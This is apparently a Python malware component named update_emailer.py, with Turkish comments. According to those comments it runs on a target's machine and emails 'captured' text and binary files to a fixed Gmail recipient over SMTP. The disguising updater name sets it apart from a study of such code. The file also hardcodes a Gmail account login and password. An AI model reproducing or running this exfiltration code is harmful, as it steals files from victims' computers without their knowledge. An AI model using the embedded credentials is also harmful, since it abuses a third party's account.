# !/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: update_emailer.py
import os
import smtplib
from email.mime.text import MIMEText
# from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

##### encoding and headers from email #####
from email.header import Header
from email import encoders
##########################################

from sys import stderr

# entering target path
from update_path_finder import *

# binary_reader dosyası hedefteki makinede değil 
# saldıran makinede çalışacak bu yüzden import etmeye gerek yok
# from binary_reader import *

# https://myaccount.google.com/u/2/lesssecureapps?pageId=none

# email göndermek için gereken kemik kodlar
msg = MIMEMultipart()
msg['From'] = 'engineeringreverse0@gmail.com'
###### subject kısmı fonksiyonun içinde ######
msg['To'] = 'berkay.girgin2@gmail.com'


def text_sender(target_file):
    msg['Subject'] = ('captured text data: {}'.format(os.path.basename(target_file)))
    # path_finder modülünden dönen içeriği yolla
    sender(msg.attach(MIMEText(target_file, 'plain')))



def image_sender(target_file):
    msg['Subject'] = ('captured byte data: {}'.format(os.path.basename(target_file)))
    # target_file zaten path_finderdaki bit dosyasının yolu
    readingAttachFile = open(target_file, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(readingAttachFile.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment', filename = os.path.basename(target_file))
    sender(msg.attach(part))


def sender(target_file):
    try:
        mail = smtplib.SMTP('smtp.gmail.com: 587')
        # enable security
        mail.starttls()
        mail.login('engineeringreverse0@gmail.com', '$PNvLby4TT')
        mail.sendmail(msg['From'], msg['To'], msg.as_string())
        print('Mail başarılı bir şekilde gönderildi.')
        mail.quit()

    except Exception as e:
        print(e)
        print('Mail gönderilemedi.')

"""
if __name__ == '__main__':
    target_file = input('hedef bilgisayarda aranacak olan dosyayı arayınız: ')
    sender(target_file)
"""
# end file
